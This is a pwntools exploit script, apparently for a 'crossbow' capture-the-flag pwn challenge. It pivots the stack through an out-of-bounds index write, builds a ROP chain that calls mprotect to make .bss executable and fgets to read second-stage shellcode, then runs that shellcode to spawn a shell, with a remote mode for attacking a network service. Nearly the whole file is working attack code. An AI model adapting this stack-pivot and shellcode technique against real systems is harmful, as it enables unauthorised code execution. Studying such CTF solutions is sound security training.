#!/usr/bin/env python3

from pwn import *

e = ELF("./crossbow_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(training+126)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # The way to call mprotect() and fgets() can be found in https://godbolt.org/z/oGhnvvrcY.

    # Overwrites the $rbp value saved on stack to the newly allocated heap address.
    # When the training() returns, $rsp will be changed to this heap address. (mov rsp, rbp; pop rbp; ret)
    # Thus we control the whole function stack frame, making ROP feasible.
    rop = ROP(e)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    r.sendlineafter(b':', b'-2')
    head_buff_size = 8
    stage_1 = flat(
            # Change .bss to rwx
            b'\x90' * 8, # garbage for passing "pop rbp" in the "mov rsp, rbp; pop rbp; ret;"
            rop.rdi[0], e.bss(), # addr
            rop.rsi[0], 0x1000, # size
            rop.rdx[0], 7, # rwx
            e.sym.mprotect,
            # Read the next stage shellcode
            rop.rdi[0], e.bss(), # addr
            rop.rsi[0], 0x80, # size
            rop.rdx[0], e.sym.__stdin_FILE, # stream (stdin)
            e.sym.fgets,
            e.bss() + head_buff_size,
            )
    r.recvuntil(b'>')
    # !!!!NOTE: you have to use send here otherwise there will be an extra newline in the stdin buffer and thus it ends the fgets() in stage_1 immediately
    r.send(stage_1)

    stage_2 = flat(
            # !!!!Note that we need extra buffer here because somehow the first few instructions may be interpreted incorrectly with 0s before it.
            {head_buff_size: asm(shellcraft.sh())}
            , filler=b'\x90')
    r.sendline(stage_2)

    r.interactive()

if __name__ == "__main__":
    main()
